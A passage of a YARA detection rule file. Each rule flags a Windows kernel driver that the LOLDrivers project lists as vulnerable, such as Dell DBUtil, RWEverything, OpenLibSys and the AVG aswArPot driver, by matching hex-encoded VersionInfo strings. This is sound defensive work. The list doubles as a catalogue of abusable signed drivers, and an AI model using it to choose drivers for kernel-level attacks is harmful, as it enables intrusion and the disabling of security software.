 uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Tgsoftsas_Viragtsys_Viritagentsystem_D0E2_RID3D19 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - viragt64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:40:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0054004700200053006f0066007400200053002e0061002e0073002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c002000360030002c00200030002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002c002000360030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007600690072006100670074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]007600690072006100670074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200054004700200053006f0066007400200053002e0061002e0073002e00200032003000300036002c002000320030003100310020002d0020007700770077002e007400670073006f00660074002e00690074 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Openlibsysorg_Openlibsyssys_Openlibsys_F060_RID3DDD : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - OpenLibSys.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:12:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004f00700065006e004c00690062005300790073 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004f00700065006e004c00690062005300790073002e006f00720067 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0031002e0033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0031002e0033 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004f00700065006e004c00690062005300790073002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004f00700065006e004c00690062005300790073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004f00700065006e004c00690062005300790073002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000370020004f00700065006e004c00690062005300790073002e006f00720067 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realixtm_Hwinfosys_Hwinfokerneldriver_4AC0_RID3D52 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - HWiNFO32.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:49:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004800570069004e0046004f003300320020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200450041004c0069005800280074006d0029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0037002e003900300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0037002e00390030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004800570069004e0046004f003300320020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290031003900390039002d00320030003100300020004d0061007200740069006e0020004d0061006c00ed006b0020002d0020005200450041004c00690058 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Rweverything_Rwdrvsys_Rweverythingreadwritedriver_2A65_RID42A3 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - AsrIbDrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:36:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00520057002d00450076006500720079007400680069006e006700200052006500610064002000260020005700720069007400650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00520057002d00450076006500720079007400680069006e0067 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00300030002e00300030002e00300030003000300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300030002e00300030002e0030003000300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00520077004400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00520057002d00450076006500720079007400680069006e006700200052006500610064002000260020005700720069007400650020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00520077004400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300038002000520057002d00450076006500720079007400680069006e0067 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_5027_RID3D9A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:01:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e00350030002e0030002e0031003000340037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e00350030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000320020002d002000320030003100320020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorp_Nvoclocksys_Nvidiasystemutilitydriver_2203_RID41F6 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvoclock.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:07:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056006900640069006100200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c002000300038002c002000300035002c002000300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002c00200030002c00200030002c00200031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e0056006f0063006c006f0063006b002e00520043 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200032003000300033 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realtek_Rtkiosys_Realtekiodriver_442C_RID3B1B : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtkio.sys, rtkio64.sys, rtkiow8x64.sys, rtkiow10x64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:15:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200650061006c00740065006b00200049004f0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200650061006c00740065006b00200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e003000300035002e0030003800320035002e00320030003100360020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e003000300035002e0030003800320035002e0032003000310036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00720074006b0069006f00360034002e0073007900730020 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005200650061006c00740065006b00200049004f00200044007200690076006500720020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00720074006b0069006f00360034002e0073007900730020 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100360020005200650061006c00740065006b002000530065006d00690063006f006e0064007500630074006f007200200043006f00720070006f0072006100740069006f006e002e00200041006c006c002000520069006700680074002000520065007300650072007600650064002e002000200020002000200020002000200020002000200020 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Ludashicom_Computerzsys_468B_RID3798 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:45:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]006c007500640061007300680069002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e00310036002e0031003000300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036002e00310036002e0031003000300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]9c8159275e08 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000310030002d00320030003100360020007700770077002e006c007500640061007300680069002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpot_Avginternetsecuritysystem_19D0_RID4508 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:18:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200041006e0074006900200052006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320030002e0037002e003100310033002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320030002e0037002e003100310033002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000320030002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Advancedmicrodevices_Amdryzenmasterdriversys_Amdryzenmasterservicedriver_9B1A_RID4BF6 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - AMDRyzenMasterDriver.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 08:14:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041004d0044002000520079007a0065006e0020004d00610073007400650072002000530065007200760069006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006400760061006e0063006500640020004d006900630072006f00200044006500760069006300650073 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0031002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0031002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0041004d004400520079007a0065006e004d00610073007400650072004400720069007600650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041004d0044002000520079007a0065006e0020004d00610073007400650072002000530065007200760069006300650020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0041004d004400520079007a0065006e004d00610073007400650072004400720069007600650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020003200300031003700200041004d0044002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Panyazilimbilisimteknolojileriticltdsti_Panmonfltsys_Pancafemanager_7E01_RID49AC : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - PanMonFlt.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 06:36:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00500061006e00430061006600650020004d0061006e0061006700650072002000460069006c00650020004d006f006e00690074006f0072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00500061006e002000590061007a0069006c0069006d002000420069006c006900730069006d002000540065006b006e006f006c006f006a0069006c0065007200690020005400690063002e0020004c00740064002e0020005300740069002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00500061006e004d006f006e0046006c0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500061006e00430061006600650020004d0061006e0061006700650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00500061006e004d006f006e0046006c0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280063002900200032003000310032002d0032003000310034002000500061006e002000590061007a0131006c0131006d002000420069006c006900730069006d002000540065006b006e006f006c006f006a0069006c0065007200690020005400690063002e0020004c00740064002e0020005300740069002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorp_Nvoclocksys_Nvidiasystemutilitydriver_F4E5_RID4223 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvoclock.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:15:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00560049004400490041002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056004900440049004100200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00300035002e00300036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00300035002e00300036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00560049004400490041002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9004e0056004900440049004100200043006f00720070002e00200032003000300033002d0032003000300034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Lenovogrouplimitedr_Lenovodiagnosticsdriversys_Lenovodiagnostics_F05B_RID48CA : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - LenovoDiagnosticsDriver.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 05:58:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c0065006e006f0076006f00200044006900610067006e006f00730074006900630073002000440072006900760065007200200066006f0072002000570069006e0064006f0077007300200031003000200061006e00640020006c0061007400650072002e } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004c0065006e006f0076006f002000470072006f007500700020004c0069006d00690074006500640020002800520029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0034002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0034002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004c0065006e006f0076006f0044006900610067006e006f00730074006900630073004400720069007600650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004c0065006e006f0076006f00200044006900610067006e006f00730074006900630073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004c0065006e006f0076006f0044006900610067006e006f00730074006900630073004400720069007600650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a9002000320030003200310020004c0065006e006f0076006f002000470072006f007500700020004c0069006d0069007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_3F20_RID2DA0 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - pchunter.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 10:39:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]7cfb7edf4fe1606f67e5770b5de55177 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]5b8982af7f5176feff0853174eacff0979d1628067099650516c53f8 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0035 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0035002e0037 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200032003000310039002d003200300032003100200041006e00580069006e00530065006300200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them\n}\n\nrule PUA_VULN_Driver_Toshibacorporation_Nchgbiosxsys_Toshibabiospackage_7D4C_RID4295 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - NCHGBIOS2x64.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:34:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00420049004f00530020005500700064006100740065002000440072006900760065007200200046006f0072002000570069006e0064006f007700730020007800360034002000450064006900740069006f006e } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0054004f0053004800490042004100200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0034002e0031002e0030002e00300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0034002e0031002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004e00430048004700420049004f00530032007800360034002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0054004f00530048004900420041002000420049004f00530020005000610063006b006100670065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00430048004700420049004f00530032007800360034002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200031003900390039002d003200300031003000200054004f0053004800490042004100200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Dell_Dbutil_71FE_RID325B : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - DBUtilDrv2.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 14:01:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00440042005500740069006c } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00440065006c006c } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0037002e0030002e0030 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00440042005500740069006c } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a900200032003000320031002000440065006c006c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e0020 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Cn_Computerzsys_6D2C_RID344B : CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 15:24:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]003300360030002e0063006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e00310033002e0031003000310039 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036002e00310033002e0031003000310039 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]9c8159275e08 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000310030002d00320030003100330020007700770077002e006c007500640061007300680069002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Atszio_Atsziodriver_673B_RID35E5 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ATSZIO.sys\"\n      author = \"Florian Roth\"\n      reference = 